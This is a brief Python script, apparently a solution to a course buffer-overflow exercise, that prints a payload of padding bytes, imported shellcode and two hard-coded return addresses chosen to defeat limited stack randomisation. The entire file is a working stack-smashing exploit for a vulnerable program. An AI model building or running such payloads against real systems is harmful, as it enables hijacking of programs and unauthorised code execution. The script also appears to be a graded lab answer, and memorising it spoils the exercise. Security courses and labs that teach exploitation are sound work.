#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
sys.stdout.buffer.write(b"a"*544) # Skip the possible move of the stack. 0x110*2=544
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b"a"*457)
sys.stdout.buffer.write(pack("<I", 0xfffeb314))
# Address is 0xfffeaf08 when there is no random. 0xfffeaf08 + 0x110 = 0xfffeb018
sys.stdout.buffer.write(pack("<I", 0xfffeb018)) # lowest possible starting position
